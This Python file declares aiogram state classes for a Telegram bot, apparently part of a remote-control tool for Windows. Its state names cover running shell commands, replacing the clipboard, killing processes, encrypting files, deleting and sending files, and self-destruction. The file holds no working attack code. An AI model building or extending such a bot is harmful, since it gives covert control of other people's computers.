##  _________________________________________
##   |_______  authors: Eks1azy     _______|
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##    \_\_\_|______  Tusay1  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\
##   ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy      / /
##  |                                        / /
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/



from aiogram.fsm.state import StatesGroup, State
import logging

class CommandShell(StatesGroup):
    waiting_command = State()

class clipboard(StatesGroup):
    waiting_for_newClipboard = State()

class ProcessState(StatesGroup):
    waiting_for_pid = State()

class Form(StatesGroup):
    folder_name = State()

class Decipher(StatesGroup):
    waiting_d_enc = State()

class CMDBOOM(StatesGroup):
    waiting_CMD = State()

class move_file(StatesGroup):
    waiting_path1 = State()
    waiting_path2 = State()

# Состояние для смены обоев
class fdesk(StatesGroup):
    waiting_photo = State()

class self_destruction(StatesGroup):
    waiting_code = State()

class Encrypt(StatesGroup):
    waiting_d = State()

class DirectoryStateSaveFiles(StatesGroup):
    waiting_for_directory_saveFiles = State()
    waiting_for_files = State()
    waiting_for_correct_directory = State()

class SoundStates(StatesGroup):
    waiting_for_file_path = State()

class Openfile(StatesGroup):
    waiting_for_dfile = State()

class waiting(StatesGroup):
    folder_name_delet = State()

class waitingfile(StatesGroup):
    file_name_send = State()

class waitmas(StatesGroup):
    file_name_delet = State()

class WebTime(StatesGroup):
    waiting_for_time = State()

current_directory = "C:/"

class DirectoryState(StatesGroup):
    waiting_for_directory = State()

class url(StatesGroup):
    waiting_url = State()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)